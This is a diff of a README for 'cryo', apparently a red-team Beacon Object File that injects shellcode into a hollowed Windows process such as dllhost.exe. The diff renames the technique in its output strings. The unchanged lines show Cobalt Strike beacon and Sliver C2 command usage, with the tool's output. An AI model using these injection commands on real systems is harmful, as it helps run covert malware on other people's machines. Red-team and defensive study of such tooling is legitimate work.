@@ -33,7 +33,7 @@ cryo C:\Windows\system32\dllhost.exe /home/kali/payload_x64.bin
 beacon> help cryo
 Usage: cryo C:\path\to\exe\to\hollow.exe /local/path/to/shellcode.bin
 beacon> cryo C:\Windows\system32\dllhost.exe /home/kali/payload_x64.bin
-[*] CRYO - Early Cryo Bird Injection Shellcode Injector
+[*] CRYO - Early Bird Cryo Injection Shellcode Injector
 [*] Reading shellcode from: /home/kali/payload_x64.bin
 [+] host called home, sent: 5842 bytes
 [+] Process start in Job! PID: 8592
@@ -63,13 +63,13 @@ After importing the BOF, the extension can be run via the `cryo` command.
 [*] Installing extension 'cryo' (v1.0.0) ...
 [server] sliver (SOFT_INVESTMENT) > extensions load /home/sliver/
 
-[*] Added cryo command: Early Cryo Bird Injection Technique
+[*] Added cryo command: Early Bird Cryo Injection Technique
 
 ...
 
 [server] sliver (SOFT_INVESTMENT) > help cryo
 
-Early Cryo Bird Injection Technique
+Early Bird Cryo Injection Technique
 
 Usage:
 ======
